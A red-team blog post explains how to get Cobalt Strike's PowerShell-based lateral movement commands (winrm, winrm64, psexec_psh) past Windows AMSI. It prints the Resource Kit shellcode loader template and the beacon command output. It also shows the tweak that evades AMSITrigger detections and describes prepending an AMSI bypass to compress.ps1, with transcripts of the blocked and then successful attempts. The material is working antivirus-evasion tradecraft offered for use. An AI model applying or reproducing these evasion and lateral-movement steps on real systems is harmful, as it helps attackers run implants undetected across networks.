---
title: "Making AMSI Jump"
date: 2020-06-16T10:52:27+01:00
authors:
    - rastamouse
draft: false
---

Since 3.13, Cobalt Strike has had a Malleable C2 option called `amsi_disable`.  This directive tells Beacon to patch the `AmsiScanBuffer` function in the host process prior to injecting post-ex capabilities such as `powerpick` and `execute-assembly`.  This limits AMSI's visibility of said process and (hopefully) prevents the PowerShell / .NET assemblies being executed from being scanned.

One set of workflows that `amsi_disable` does not apply to, are the new (as of 4.0) `jump` commands.

```
beacon> help jump
Use: jump [exploit] [target] [listener]

Attempt to spawn a session on a remote target with the specified exploit.

Type jump by itself to see a list of available remote exploits.

beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

`psexec_psh`, `winrm` and `winrm64` all use PowerShell and will be the subject of this post.

When lateral movement via `winrm` / `winrm64` is blocked by AMSI, the output very helpfully lets us know that's what's happening.

![winrm64-blocked](/images/making-amsi-jump/winrm64-blocked.png "winrm64 blocked")

`psexec_psh` is understandably less helpful.  We see a service has been created and started, but we can't connect to the target.

![psexec_psh-blocked](/images/making-amsi-jump/psexec_psh-blocked.png "psexec_psh blocked")

## Resource Kit & AMSITrigger

The default PowerShell templates used to generate these payloads can be overridden using the [Resource Kit](https://www.cobaltstrike.com/scripts).  Within this package, we have `resources.cna`, `template.x86.ps1`, `template.x64.ps1` and `compress.ps1`.

Within these templates, there are lines such as

```text
[Byte[]]$var_code = [System.Convert]::FromBase64String('%%DATA%%')
```

where `%%DATA%%` is simply a placeholder for the actual Beacon payload.

First off, we can use a tool such as [AMSITrigger](https://github.com/RythmStick/AMSITrigger) to see if any detections are triggered from the templates themselves.

```text
D:\Tools\AMSITrigger\AMSITrigger\bin\Debug>AmsiTrigger.exe -i D:\Tools\cobaltstrike\resourcekit\template.x64.ps1 -f 2
[23]    "If ([IntPtr]::size -eq 8) {
        [Byte[]]$var_code = [System.Convert]::FromBase64String('%%DATA%%')

        for ($x = 0; $x -lt $var_code.Count; $x++) {
                $var_code[$x] = $var_code[$x] -bxor 35
        }

        $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
        $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

        $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
        $var_runme.Invoke([IntPtr]::Zero"
```

The general methodology here is to make modifications to the code being highlighted as malicious and re-scanning with AMSITrigger.  I was able to circumvent by simply adding `else { return }` to the end of the `If ([IntPtr]::size -eq 8)` block `¯\_(ツ)_/¯`.

Now if we load `resources.cna` into the Cobalt Strike Script Manager, and try `jump winrm64` again...

```text
beacon> jump winrm64 WIN-CJ8120QPH84 tcp
[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via WinRM
[+] host called home, sent: 219563 bytes
[+] established link to child beacon: 192.168.152.128
```

Repeat the same process with `template.x86.ps1` and we can have `jump winrm` working as well.

```text
beacon> jump winrm WIN-CJ8120QPH84 tcp
[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via WinRM
[+] host called home, sent: 195283 bytes
[+] established link to child beacon: 192.168.152.128
```

## The Compression Problem

Even though `psexec_psh` also uses `template.x86.ps1`, it was still failing.  By enabling PowerShell Transcript logging on the test target, I was able to see what was happening.

```text
Windows PowerShell transcript start
Start time: 20200616135045
Username: TESTLAB\SYSTEM
RunAs User: TESTLAB\SYSTEM
Machine: WIN-CJ8120QPH84 (Microsoft Windows NT 10.0.14393.0)
Host Application: powershell -nop -w hidden -enc JABz[...snip...]ADsA
**********************
PS>$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sI[...snip...]CwAA"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
At line:1 char:1
+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus
software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordEx
   ception
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

It seems that AMSI has a real issue with base64 decoding and decompressing a GZIP compressed binary - regardless of the actual binary itself.  We can verify this by using `cmd.exe` as a test candidate.

```text
PS > $cmdBytes = [System.IO.File]::ReadAllBytes("C:\Windows\System32\cmd.exe")
PS > [System.IO.MemoryStream] $ms = New-Object System.IO.MemoryStream
PS > $gs = New-Object System.IO.Compression.GzipStream $ms, ([IO.Compression.CompressionMode]::Compress)
PS > $gs.Write($cmdBytes, 0, $cmdBytes.Length)
PS > $gs.Close(); $ms.Close()
PS > [System.Convert]::ToBase64String($ms.ToArray()) | clip
```

Now if we try to decode and decompress...

```text
PS C:\Users\Daniel> $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sI[...snip...]AA=="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

At line:1 char:1
+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

My first thoughts for trying to get around this was to modify `compress.ps1` and transform the data in a different way or find a different compression method.  Whilst experimenting, I actually made syntactic error near the top of the script and saw PowerShell errors being spat out in the transcript log, prior to the actual AMSI error being thrown.

```text
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The term 'some-garbage' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again."
some-garbage : The term 'some-garbage' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ some-garbage;
```

This showed that I have code execution prior to the Beacon payload being decoded, so I placed a custom version of my [old AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1) at the very top of `compress.ps1` which seemed to do the trick.

```text
beacon> jump psexec_psh WIN-CJ8120QPH84 tcp
[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via Service Control Manager (PSH)
[+] host called home, sent: 210319 bytes
[+] received output:
Started service f718f3b on WIN-CJ8120QPH84
[+] established link to child beacon: 192.168.152.128
```

## Conclusion

The flexibility provided by the Resource Kit allows you to transform Cobalt Strike's artifacts in practically anyway you may choose and it just goes to show how little effort you sometimes have to put in to achieve quite decent results.
